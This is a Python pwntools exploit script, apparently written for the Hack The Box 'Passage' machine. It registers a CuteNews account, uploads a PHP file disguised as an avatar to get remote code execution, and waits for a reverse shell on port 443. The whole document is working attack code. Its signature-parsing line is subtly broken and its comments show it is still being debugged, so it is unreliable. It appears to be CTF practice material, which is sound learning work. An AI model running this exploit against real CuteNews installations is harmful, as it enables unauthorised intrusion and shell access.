#!/usr/bin/python3

from pwn import * # pip3 install pwntools for blackarch it is pacman -S pwntools
import pdb # Debugging
import re # REGEX
import requests
import signal
import time
import threading


def def_handler(sig, frame):
    print("\n\n[!] Exiting the autopwn_passage script...\n")
    sys.exit(1)



# CTRL + C
signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) !=5:
    print("\n\n[!] Usage: python3 " + sys.argv[0] + " http://10.10.10.206/CuteNews/[user][password][filename.php]\n")
    sys.exit(1)

# GLOBAL VARIABLES
main_url = sys.argv[1]
user = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
lport = 443                  # <<< Change me

register_url = main_url +  "index.php?register"
#pdb.set_trace()
get_values_url =  main_url + "index.php?mod=main&opt=personal"
login_url = main_url + "index.php"
rce_url = main_url + "uploads/avatar_%s_%s" % (user, filename)
# Proxy
# proxy = {'http': 'http://127.0.0.1/8080'} <<< This syntax does not work for me, but the below version does.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
# In part2 of this script I am troubleshooting using pdb.set_trace() instead of proxying through burp
def registerUser():
    #print("\ninside function registerUser!\n")
    post_data = {
        'action': 'register',
        'regusername': '%s' % user,
        'regnickname': '%s' % user,
        'regpassword': '%s' % password,
        'confirm': '%s' % password,
        'regemail': '%s@%s.com' % (user,user)
    }
    #pdb.set_trace()
    r = requests.post(register_url, data=post_data)
# In part2 of this script I define a function called upload file
def uploadFile():
    s = requests.session()
    post_data = {
        'action': 'dologin',
        'username': '%s' % user,
        'password': '%s' % password
    }
    r = s.post(login_url, data=post_data)
    r = s.get(get_values_url)
    #print(r.text)
    signatureKey = re.findall(r'name="__signature_key" value="(.*?)"', r.text[0])
    signatureDsi = re.findall(r'name="__signature_dsi" value="(.*?)"', r.text[0])
    #pdb.set_trace()
    post_data = {
        'mod': 'main',
        'opt': 'personal',
        '__signature_key': signatureKey,
        '__signature_dsi': signatureDsi,
        'editpassword': '',
        'confirmpassword': '',
        'editnickname': '%s' % user,
    }

    f = open(filename, "r")
    content = f.read()
    #print(content)
    file_to_upload = {'avatar_file': (filename, content)}
    r = s.post(login_url, data=post_data, files=file_to_upload)
    r = s.get(rce_url)
    #pdb.set_trace()
if __name__ == '__main__':
    registerUser()
    try:
        threading.Thread(target=uploadFile, args=()).start()
    except Exception as e:
        log.error(str(e))
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()